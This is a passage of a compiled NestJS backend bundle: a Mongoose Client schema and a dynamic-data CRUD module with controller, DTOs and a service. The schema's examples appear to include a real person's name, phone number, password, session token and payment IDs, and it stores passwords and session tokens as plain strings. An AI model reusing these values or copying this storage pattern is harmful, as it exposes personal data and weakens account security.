    (0, swagger_1.ApiProperty)({ example: 'Shruthi Reddy', description: 'Name of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '916265240911', description: 'mobile number of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Ajtdmwajt1@', description: 'Password of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "repl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "promoteRepl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuM==', description: 'Session token' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Username of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "deployKey", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Main account of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "mainAccount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'booklet_10', description: 'Product associated with the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "product", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'paytmqr281005050101xv6mfg02t4m9@paytm', description: 'Paytm QR ID of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "qrId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'myred1808@postbank', description: 'Google Pay ID of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "gpayId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ['192.168.1.100:8080', '192.168.1.101:8080'], description: 'Dedicated proxy IPs assigned to this client' }),
    (0, mongoose_1.Prop)({ required: false, type: [String], default: [] }),
    __metadata("design:type", Array)
], Client.prototype, "dedicatedIps", void 0);
exports.Client = Client = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'clients', versionKey: false, autoIndex: true, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], Client);
exports.ClientSchema = mongoose_1.SchemaFactory.createForClass(Client);


/***/ }),

/***/ "./src/components/dynamic-data/dto/create-dynamic-data.dto.ts":
/*!********************************************************************!*\
  !*** ./src/components/dynamic-data/dto/create-dynamic-data.dto.ts ***!
  \********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateDynamicDataDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreateDynamicDataDto {
}
exports.CreateDynamicDataDto = CreateDynamicDataDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Unique identifier for the dynamic data',
        example: 'user123',
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], CreateDynamicDataDto.prototype, "configKey", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Dynamic JSON data',
        example: {
            profile: {
                name: 'John Doe',
                age: 30,
            },
            preferences: {
                theme: 'dark',
                notifications: true,
            },
        },
    }),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", Object)
], CreateDynamicDataDto.prototype, "data", void 0);


/***/ }),

/***/ "./src/components/dynamic-data/dto/get-dynamic-data.dto.ts":
/*!*****************************************************************!*\
  !*** ./src/components/dynamic-data/dto/get-dynamic-data.dto.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.GetDynamicDataDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class GetDynamicDataDto {
}
exports.GetDynamicDataDto = GetDynamicDataDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Path to retrieve specific data using dot notation',
        example: 'profile.name',
        required: false,
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.Matches)(/^[a-zA-Z0-9]+([\._][a-zA-Z0-9]+)*$/, {
        message: 'Invalid path format. Use dot notation (e.g., profile.name)',
    }),
    __metadata("design:type", String)
], GetDynamicDataDto.prototype, "path", void 0);


/***/ }),

/***/ "./src/components/dynamic-data/dto/update-dynamic-data.dto.ts":
/*!********************************************************************!*\
  !*** ./src/components/dynamic-data/dto/update-dynamic-data.dto.ts ***!
  \********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateDynamicDataDto = exports.ArrayOperation = exports.ArrayOperationType = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
var ArrayOperationType;
(function (ArrayOperationType) {
    ArrayOperationType["PUSH"] = "PUSH";
    ArrayOperationType["POP"] = "POP";
    ArrayOperationType["INSERT"] = "INSERT";
    ArrayOperationType["REMOVE"] = "REMOVE";
    ArrayOperationType["UPDATE"] = "UPDATE";
})(ArrayOperationType || (exports.ArrayOperationType = ArrayOperationType = {}));
class ArrayOperation {
}
exports.ArrayOperation = ArrayOperation;
__decorate([
    (0, swagger_1.ApiProperty)({
        enum: ArrayOperationType,
        description: 'Type of array operation to perform',
    }),
    (0, class_validator_1.IsEnum)(ArrayOperationType),
    __metadata("design:type", String)
], ArrayOperation.prototype, "type", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Index for array operations (required for INSERT and UPDATE)',
        required: false,
    }),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], ArrayOperation.prototype, "index", void 0);
class UpdateDynamicDataDto {
}
exports.UpdateDynamicDataDto = UpdateDynamicDataDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Path to the field to update using dot notation. If not provided, updates entire data object.',
        example: 'profile.age',
        required: false,
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.Matches)(/^[a-zA-Z0-9]+([\._][a-zA-Z0-9]+)*$/, {
        message: 'Invalid path format. Use dot notation (e.g., profile.age)',
    }),
    __metadata("design:type", String)
], UpdateDynamicDataDto.prototype, "path", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'New value for the field or entire data object if path is not provided',
        example: { profile: { age: 31 } },
    }),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", Object)
], UpdateDynamicDataDto.prototype, "value", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Array operation configuration',
        required: false,
        type: ArrayOperation,
    }),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", ArrayOperation)
], UpdateDynamicDataDto.prototype, "arrayOperation", void 0);


/***/ }),

/***/ "./src/components/dynamic-data/dynamic-data.controller.ts":
/*!****************************************************************!*\
  !*** ./src/components/dynamic-data/dynamic-data.controller.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.DynamicDataController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const dynamic_data_service_1 = __webpack_require__(/*! ./dynamic-data.service */ "./src/components/dynamic-data/dynamic-data.service.ts");
const create_dynamic_data_dto_1 = __webpack_require__(/*! ./dto/create-dynamic-data.dto */ "./src/components/dynamic-data/dto/create-dynamic-data.dto.ts");
const update_dynamic_data_dto_1 = __webpack_require__(/*! ./dto/update-dynamic-data.dto */ "./src/components/dynamic-data/dto/update-dynamic-data.dto.ts");
const get_dynamic_data_dto_1 = __webpack_require__(/*! ./dto/get-dynamic-data.dto */ "./src/components/dynamic-data/dto/get-dynamic-data.dto.ts");
let DynamicDataController = class DynamicDataController {
    constructor(dynamicDataService) {
        this.dynamicDataService = dynamicDataService;
    }
    async create(createDynamicDataDto) {
        return this.dynamicDataService.create(createDynamicDataDto);
    }
    async findAll() {
        return this.dynamicDataService.findAll();
    }
    async checkNpoint() {
        await this.dynamicDataService.checkNpoint();
        return { message: 'Npoint check completed' };
    }
    async findOne(configKey, { path }) {
        return this.dynamicDataService.findOne(configKey, path);
    }
    async update(configKey, updateDynamicDataDto) {
        return this.dynamicDataService.update(configKey, updateDynamicDataDto);
    }
    async remove(configKey, { path }) {
        await this.dynamicDataService.remove(configKey, path);
    }
};
exports.DynamicDataController = DynamicDataController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new dynamic data document' }),
    (0, swagger_1.ApiResponse)({
        status: 201,
        description: 'The dynamic data document has been successfully created.',
    }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Bad Request' }),
    (0, swagger_1.ApiResponse)({ status: 409, description: 'Conflict - Document already exists' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_dynamic_data_dto_1.CreateDynamicDataDto]),
    __metadata("design:returntype", Promise)
], DynamicDataController.prototype, "create", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all dynamic data documents' }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Returns all dynamic data documents as a key-value object',
    }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], DynamicDataController.prototype, "findAll", null);
__decorate([
    (0, common_1.Post)('check-npoint'),
    (0, common_1.HttpCode)(common_1.HttpStatus.OK),
    (0, swagger_1.ApiOperation)({ summary: 'Check and update npoint data if needed' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Npoint data check completed successfully' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], DynamicDataController.prototype, "checkNpoint", null);
__decorate([
    (0, common_1.Get)(':configKey'),
    (0, swagger_1.ApiOperation)({ summary: 'Get dynamic data by configKey' }),
    (0, swagger_1.ApiParam)({ name: 'configKey', description: 'Unique identifier for the document' }),
    (0, swagger_1.ApiQuery)({
        name: 'path',
        required: false,
        description: 'Optional path to retrieve specific nested data',
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Returns the requested dynamic data' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Document or path not found' }),
    __param(0, (0, common_1.Param)('configKey')),
    __param(1, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, get_dynamic_data_dto_1.GetDynamicDataDto]),
    __metadata("design:returntype", Promise)
], DynamicDataController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':configKey'),
    (0, swagger_1.ApiOperation)({ summary: 'Update dynamic data by configKey' }),
    (0, swagger_1.ApiParam)({ name: 'configKey', description: 'Unique identifier for the document' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'The dynamic data has been successfully updated' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Bad Request' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Document not found' }),
    __param(0, (0, common_1.Param)('configKey')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_dynamic_data_dto_1.UpdateDynamicDataDto]),
    __metadata("design:returntype", Promise)
], DynamicDataController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':configKey'),
    (0, common_1.HttpCode)(common_1.HttpStatus.NO_CONTENT),
    (0, swagger_1.ApiOperation)({ summary: 'Delete dynamic data by configKey' }),
    (0, swagger_1.ApiParam)({ name: 'configKey', description: 'Unique identifier for the document' }),
    (0, swagger_1.ApiQuery)({
        name: 'path',
        required: false,
        description: 'Optional path to delete specific nested data',
    }),
    (0, swagger_1.ApiResponse)({ status: 204, description: 'The dynamic data has been successfully deleted' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Document or path not found' }),
    __param(0, (0, common_1.Param)('configKey')),
    __param(1, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, get_dynamic_data_dto_1.GetDynamicDataDto]),
    __metadata("design:returntype", Promise)
], DynamicDataController.prototype, "remove", null);
exports.DynamicDataController = DynamicDataController = __decorate([
    (0, swagger_1.ApiTags)('dynamic-data'),
    (0, common_1.Controller)('dynamic-data'),
    __metadata("design:paramtypes", [dynamic_data_service_1.DynamicDataService])
], DynamicDataController);


/***/ }),

/***/ "./src/components/dynamic-data/dynamic-data.module.ts":
/*!************************************************************!*\
  !*** ./src/components/dynamic-data/dynamic-data.module.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.DynamicDataModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const dynamic_data_controller_1 = __webpack_require__(/*! ./dynamic-data.controller */ "./src/components/dynamic-data/dynamic-data.controller.ts");
const dynamic_data_service_1 = __webpack_require__(/*! ./dynamic-data.service */ "./src/components/dynamic-data/dynamic-data.service.ts");
const dynamic_data_schema_1 = __webpack_require__(/*! ./dynamic-data.schema */ "./src/components/dynamic-data/dynamic-data.schema.ts");
const n_point_1 = __webpack_require__(/*! ../n-point */ "./src/components/n-point/index.ts");
let DynamicDataModule = class DynamicDataModule {
};
exports.DynamicDataModule = DynamicDataModule;
exports.DynamicDataModule = DynamicDataModule = __decorate([
    (0, common_1.Module)({
        imports: [
            mongoose_1.MongooseModule.forFeature([
                { name: dynamic_data_schema_1.DynamicData.name, schema: dynamic_data_schema_1.DynamicDataSchema },
            ]),
            n_point_1.NpointModule,
        ],
        controllers: [dynamic_data_controller_1.DynamicDataController],
        providers: [dynamic_data_service_1.DynamicDataService],
        exports: [dynamic_data_service_1.DynamicDataService],
    })
], DynamicDataModule);


/***/ }),

/***/ "./src/components/dynamic-data/dynamic-data.schema.ts":
/*!************************************************************!*\
  !*** ./src/components/dynamic-data/dynamic-data.schema.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.DynamicDataSchema = exports.DynamicData = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let DynamicData = class DynamicData {
};
exports.DynamicData = DynamicData;
__decorate([
    (0, mongoose_1.Prop)({ required: true, unique: true, type: String }),
    __metadata("design:type", String)
], DynamicData.prototype, "configKey", void 0);
__decorate([
    (0, mongoose_1.Prop)({ type: mongoose_2.Schema.Types.Mixed, required: true }),
    __metadata("design:type", Object)
], DynamicData.prototype, "data", void 0);
exports.DynamicData = DynamicData = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'dynamic_data',
        versionKey: false,
        timestamps: true,
        strict: false,
        toJSON: {
            transform: (_, ret) => {
                delete ret._id;
                return ret;
            },
        },
    })
], DynamicData);
exports.DynamicDataSchema = mongoose_1.SchemaFactory.createForClass(DynamicData);


/***/ }),

/***/ "./src/components/dynamic-data/dynamic-data.service.ts":
/*!*************************************************************!*\
  !*** ./src/components/dynamic-data/dynamic-data.service.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
var DynamicDataService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.DynamicDataService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const dynamic_data_schema_1 = __webpack_require__(/*! ./dynamic-data.schema */ "./src/components/dynamic-data/dynamic-data.schema.ts");
const update_dynamic_data_dto_1 = __webpack_require__(/*! ./dto/update-dynamic-data.dto */ "./src/components/dynamic-data/dto/update-dynamic-data.dto.ts");
const lodash_1 = __webpack_require__(/*! lodash */ "lodash");
const mongoose_3 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose = __importStar(__webpack_require__(/*! mongoose */ "mongoose"));
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const common_2 = __webpack_require__(/*! ../../utils/common */ "./src/utils/common.ts");
const npoint_service_1 = __webpack_require__(/*! ../n-point/npoint.service */ "./src/components/n-point/npoint.service.ts");
let DynamicDataService = DynamicDataService_1 = class DynamicDataService {
    constructor(dynamicDataModel, connection, npointService) {
        this.dynamicDataModel = dynamicDataModel;
        this.connection = connection;
        this.npointService = npointService;
        this.logger = new common_1.Logger(DynamicDataService_1.name);
    }
    async create(createDto) {
        this.logger.debug(`Creating dynamic data with configKey: ${createDto.configKey}`);
        const session = await this.connection.startSession();
        try {
            await session.startTransaction();
            this.logger.debug('Started transaction for create operation');
            const exists = await this.dynamicDataModel.findOne({ configKey: createDto.configKey }).session(session);
            if (exists) {
                this.logger.warn(`Attempted to create duplicate configKey: ${createDto.configKey}`);
                throw new common_1.ConflictException(`Document with configKey ${createDto.configKey} already exists`);
            }
            const created = new this.dynamicDataModel(createDto);
            await created.save({ session });
            this.logger.debug(`Successfully created dynamic data for configKey: ${createDto.configKey}`);
            await session.commitTransaction();
            this.logger.debug('Transaction committed successfully');
            return created.toJSON().data;
        }
        catch (error) {
            await session.abortTransaction();
            (0, utils_1.parseError)(error, 'Failed to create dynamic data: ', true);
            this.logger.error(`Failed to create dynamic data: ${error.message}`, error.stack);
            if (error instanceof common_1.ConflictException) {
                throw error;
            }
            throw new common_1.BadRequestException('Failed to create dynamic data');
        }
        finally {
            await session.endSession();
        }
    }
    async findOne(configKey, path) {
        this.logger.debug(`Finding dynamic data with configKey: ${configKey}${path ? `, path: ${path}` : ''}`);
        const doc = await this.dynamicDataModel.findOne({ configKey });
        if (!doc) {
            this.logger.warn(`Document not found with configKey: ${configKey}`);
            throw new common_1.NotFoundException(`Document with configKey ${configKey} not found`);
        }
        if (path) {
            if (!(0, lodash_1.has)(doc.data, path)) {
                this.logger.warn(`Path ${path} not found in document with configKey: ${configKey}`);
                throw new common_1.NotFoundException(`Path ${path} not found in document`);
            }
            this.logger.debug(`Successfully retrieved data at path: ${path}`);
            return (0, lodash_1.get)(doc.data, path);
        }
        this.logger.debug(`Successfully retrieved full document for configKey: ${configKey}`);
        return doc.toJSON().data;
    }
    async update(configKey, updateDto, session) {
        this.logger.debug(`Updating dynamic data for configKey: ${configKey}`);
        const useSession = session || await this.connection.startSession();
        let shouldEndSession = false;
        try {
            if (!session) {
                shouldEndSession = true;
                await useSession.startTransaction();
                this.logger.debug('Started new transaction for update operation');
            }
            const doc = await this.dynamicDataModel.findOne({ configKey }).session(useSession);
            if (!doc) {
                this.logger.warn(`Document not found with configKey: ${configKey}`);
                throw new common_1.NotFoundException(`Document with configKey ${configKey} not found`);
            }
            if (updateDto.arrayOperation) {
                if (!updateDto.path) {
                    this.logger.error('Attempted array operation without specifying path');
                    throw new common_1.BadRequestException('Path is required for array operations');
                }
                this.logger.debug(`Performing array operation: ${updateDto.arrayOperation.type} on path: ${updateDto.path}`);
                await this.handleArrayOperation(doc, updateDto, useSession);
            }
            else if (updateDto.path) {
                if (!(0, lodash_1.has)(doc.data, updateDto.path)) {
                    this.logger.warn(`Path ${updateDto.path} not found in document with configKey: ${configKey}`);
                    throw new common_1.NotFoundException(`Path ${updateDto.path} not found in document`);
                }
                this.logger.debug(`Updating value at path: ${updateDto.path}`);
                (0, lodash_1.set)(doc.data, updateDto.path, updateDto.value);
            }
            else {
                this.logger.debug('Performing full data update');
                doc.data = updateDto.value;
            }
            await doc.save({ session: useSession });
            this.logger.debug(`Successfully updated document with configKey: ${configKey}`);
            if (shouldEndSession) {
                await useSession.commitTransaction();
                this.logger.debug('Transaction committed successfully');
            }
            return doc.toJSON();
        }
        catch (error) {
            if (shouldEndSession) {
                await useSession.abortTransaction();
                this.logger.error('Transaction aborted due to error');
            }
            (0, utils_1.parseError)(error, 'Failed to update dynamic data: ', true);
            this.logger.error(`Failed to update dynamic data: ${error.message}`, error.stack);
            throw error;
        }
        finally {
            if (shouldEndSession) {
                await useSession.endSession();
            }
        }
    }
    async handleArrayOperation(doc, updateDto, session) {
        this.logger.debug(`Handling array operation: ${updateDto.arrayOperation.type} at path: ${updateDto.path}`);
        const array = (0, lodash_1.get)(doc.data, updateDto.path);
        if (!Array.isArray(array)) {
            this.logger.error(`Path ${updateDto.path} is not an array`);
            throw new common_1.BadRequestException(`Path ${updateDto.path} is not an array`);
        }
        const { type, index } = updateDto.arrayOperation;
        try {
            switch (type) {
                case update_dynamic_data_dto_1.ArrayOperationType.PUSH:
                    this.logger.debug(`Pushing new value to array at path: ${updateDto.path}`);
                    array.push(updateDto.value);
                    break;
                case update_dynamic_data_dto_1.ArrayOperationType.POP:
                    this.logger.debug(`Popping value from array at path: ${updateDto.path}`);
                    array.pop();
                    break;
                case update_dynamic_data_dto_1.ArrayOperationType.INSERT:
                    if (index === undefined || index < 0 || index > array.length) {
                        this.logger.error(`Invalid index ${index} for INSERT operation`);
                        throw new common_1.BadRequestException('Invalid array index for INSERT operation');
                    }
                    this.logger.debug(`Inserting value at index ${index} in array at path: ${updateDto.path}`);
                    array.splice(index, 0, updateDto.value);
                    break;
                case update_dynamic_data_dto_1.ArrayOperationType.REMOVE:
                    if (index === undefined || index < 0 || index >= array.length) {
                        this.logger.error(`Invalid index ${index} for REMOVE operation`);
                        throw new common_1.BadRequestException('Invalid array index for REMOVE operation');
                    }
                    this.logger.debug(`Removing value at index ${index} from array at path: ${updateDto.path}`);
                    array.splice(index, 1);
                    break;
                case update_dynamic_data_dto_1.ArrayOperationType.UPDATE:
                    if (index === undefined || index < 0 || index >= array.length) {
                        this.logger.error(`Invalid index ${index} for UPDATE operation`);
                        throw new common_1.BadRequestException('Invalid array index for UPDATE operation');
                    }
                    this.logger.debug(`Updating value at index ${index} in array at path: ${updateDto.path}`);
                    array[index] = updateDto.value;
                    break;
                default:
                    this.logger.error(`Invalid array operation type: ${type}`);
                    throw new common_1.BadRequestException('Invalid array operation type');
            }
            (0, lodash_1.set)(doc.data, updateDto.path, array);
            await doc.save({ session });
            this.logger.debug('Array operation completed successfully');
        }
        catch (error) {
            this.logger.error(`Array operation failed: ${error.message}`, error.stack);
            throw error;
        }
    }
